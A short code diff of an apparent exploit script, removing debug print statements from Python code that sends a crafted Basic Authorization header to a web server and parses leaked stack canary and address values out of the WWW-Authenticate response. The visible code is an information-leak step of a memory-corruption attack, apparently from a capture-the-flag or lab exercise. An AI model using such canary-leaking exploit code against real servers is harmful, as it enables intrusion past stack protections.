@@ -21,10 +21,8 @@ def transform_address(address):
 	for b in mybytes:
 		if int(b) != 0:
 			mystring += '%c' % int(b)
-			print(int(b))
 		else:
 			mystring += '%c' % 0x26
-			print(0x26)
 	return mystring
 
 
@@ -41,7 +39,6 @@ def set_variables():
 	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
 	response = requests.get(url,headers = headers)
 
-	print(response.status_code)
 	mystring = response.headers['WWW-Authenticate'][13:-1].split(' ')
 
 
@@ -51,7 +48,6 @@ def set_variables():
 	canary = int(mystring[-4],16)
 	address_3rd = int(mystring[4],16)
 
-	print(mystring[-9])
 	address_9th = int(mystring[-9],16)
 
 	time.sleep(1)
